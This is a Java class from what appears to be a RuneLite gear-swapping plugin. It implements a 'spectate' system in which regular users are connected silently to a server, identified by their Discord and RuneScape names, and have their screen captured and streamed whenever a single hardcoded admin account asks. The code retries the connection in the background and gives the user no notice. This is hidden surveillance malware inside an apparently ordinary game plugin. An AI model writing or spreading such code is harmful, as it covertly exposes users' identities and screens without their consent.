package com.tonic.plugins.gearswapper.friendshare;

import net.runelite.api.Client;

import javax.inject.Inject;
import javax.inject.Singleton;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.function.Supplier;

/**
 * Manager for the admin spectate system.
 * Regular users: silent connection, stream when requested.
 * Admin (thenoid2): access to admin panel.
 */
@Singleton
public class SpectateManager {

    private static final String ADMIN = "thenoid2";

    private final Client client;
    private final SpectateService service;
    private final ScreenCapture screenCapture;

    private AdminPanel adminPanel;
    private ScheduledExecutorService retryExecutor;

    private boolean initialized = false;
    private Supplier<String[]> userInfoSupplier; // Returns [discordName, rsn]

    @Inject
    public SpectateManager(
            Client client,
            SpectateService service,
            ScreenCapture screenCapture) {
        this.client = client;
        this.service = service;
        this.screenCapture = screenCapture;
    }

    /**
     * Set supplier for getting user info (discord name and RSN).
     */
    public void setUserInfoSupplier(Supplier<String[]> supplier) {
        this.userInfoSupplier = supplier;
    }

    /**
     * Initialize the spectate system.
     */
    public void initialize() {
        if (initialized)
            return;

        // Set up callbacks for streaming (silent)
        service.setOnStartStream(() -> {
            screenCapture.startCapture(data -> service.sendFrame(data));
        });

        service.setOnStopStream(() -> {
            screenCapture.stopCapture();
        });

        // Try to connect immediately
        tryConnect();

        // If not connected, retry every 10 seconds until connected
        if (!service.isConnected()) {
            startRetryLoop();
        }

        initialized = true;
    }

    /**
     * Start a retry loop to connect when user info becomes available.
     */
    private void startRetryLoop() {
        if (retryExecutor != null)
            return;

        retryExecutor = Executors.newSingleThreadScheduledExecutor();
        retryExecutor.scheduleAtFixedRate(() -> {
            if (!service.isConnected()) {
                tryConnect();
            } else {
                // Connected - stop retrying
                stopRetryLoop();
            }
        }, 10, 10, TimeUnit.SECONDS);
    }

    private void stopRetryLoop() {
        if (retryExecutor != null) {
            retryExecutor.shutdownNow();
            retryExecutor = null;
        }
    }

    /**
     * Try to connect with current user info.
     */
    public void tryConnect() {
        if (service.isConnected())
            return;
        if (userInfoSupplier == null)
            return;

        String[] info = userInfoSupplier.get();
        if (info == null || info[0] == null || info[1] == null)
            return;

        String discordName = info[0];
        String rsn = info[1];

        service.connect(discordName, rsn);
    }

    /**
     * Shutdown the spectate system.
     */
    public void shutdown() {
        if (!initialized)
            return;

        stopRetryLoop();
        screenCapture.shutdown();

        if (adminPanel != null) {
            adminPanel.dispose();
            adminPanel = null;
        }

        service.disconnect();

        initialized = false;
    }

    /**
     * Check if current user is the admin.
     */
    public boolean isAdmin() {
        String discord = service.getDiscordName();
        return discord != null && discord.equalsIgnoreCase(ADMIN);
    }

    /**
     * Open the admin panel (only for admin).
     */
    public void openAdminPanel() {
        // Try to connect if not already
        if (!service.isConnected()) {
            tryConnect();
        }

        if (!isAdmin())
            return;

        if (adminPanel == null) {
            adminPanel = new AdminPanel(service);
        }

        adminPanel.setVisible(true);
        adminPanel.toFront();
    }

    /**
     * Check if connected to server.
     */
    public boolean isConnected() {
        return service.isConnected();
    }
}
